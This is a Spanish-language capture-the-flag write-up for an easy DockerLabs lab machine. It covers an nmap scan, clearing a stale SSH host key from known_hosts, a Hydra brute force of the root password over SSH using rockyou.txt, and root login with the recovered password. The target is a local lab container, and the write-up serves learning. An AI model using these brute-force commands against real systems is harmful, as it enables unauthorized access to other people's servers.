# Write-up - Problemas de SSH y fingerprint

**Sitio:** DockerLabs  
**Dificultad:** Muy Fácil  
**Fecha:** 25/05/2025  
**Aprendizaje:** Mi cliente SSH guarda "firmas" de servidores a los que me conecto. Si la firma de un servidor cambia (por ejemplo, si la máquina virtual se reinició), SSH se "asusta" y bloquea la conexión por seguridad. Borrando la firma vieja, le doy permiso a SSH para que acepte la "nueva" identidad del servidor, y así poder intentar loguearme.  
RECORDAR: Un "fingerprint" (o huella digital en español), en el contexto de SSH y la ciberseguridad, es como la firma única e irrepetible de una clave criptográfica pública.  
Este ejercicio me permitió entender cómo funcionan las firmas digitales (fingerprints) en SSH, su rol en la seguridad y cómo resolver conflictos al cambiar la identidad de una máquina en entornos de práctica.
También reforcé el uso de Hydra y SSH, y cómo gestionar manualmente el archivo known_hosts para evitar bloqueos durante auditorías o pentesting.

---

## Enumeración y acceso

### 1. Escaneo de puertos

`sudo nmap -sSV -O --open 172.17.0.2`

> Resultado:  

`22/tcp => SSH`  
`Sistema operativo: Linux`

### 2. Intento de conexión por SSH

`ssh -l anonymous 172.17.0.2`

Mensaje de error:  

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  

Offending ECDSA key in /home/kali/.ssh/known_hosts:6  
  remove with:  
  ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'  

Host key verification failed.  

Este error indica que la huella digital de la clave pública del servidor SSH ha cambiado con respecto a la que tu cliente SSH tenía guardada en `~/.ssh/known_hosts`.
Esto es una medida de seguridad contra ataques Man-in-the-Middle. En un entorno de laboratorio, casi siempre significa que la máquina virtual se reinició, se reconfiguró o se restauró.

> En el mismo mensaje obtuve la solución sugerida.

### 3. Limpieza del known_hosts

`ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'`

> Resultado:

 `Host 172.17.0.2 found: line 4`  
 `Host 172.17.0.2 found: line 5`  
 `Host 172.17.0.2 found: line 6`  
`/home/kali/.ssh/known_hosts updated.`  
`Original contents retained as /home/kali/.ssh/known_hosts.old`  

> Explicación del comando:

`ssh-keygen`: Utilidad para gestionar claves SSH.

`-f '/home/kali/.ssh/known_hosts'`: Especifica el archivo sobre el que se va a operar.

`-R '172.17.0.2'`: Remueve todas las entradas asociadas a esa IP.

Esto confirmó que las entradas antiguas fueron eliminadas correctamente.  
Propósito: permitir que SSH acepte la nueva clave pública del servidor objetivo para poder continuar con el ataque.

### 4. Fuerza bruta con Hydra

`hydra -l root -P rockyou.txt -V ssh://172.17.0.2`

> Contraseña encontrada: `estrella`

### 5. Acceso como root

`ssh -l root 172.17.0.2`

> Acceso concedido.  
Usuario: `root`

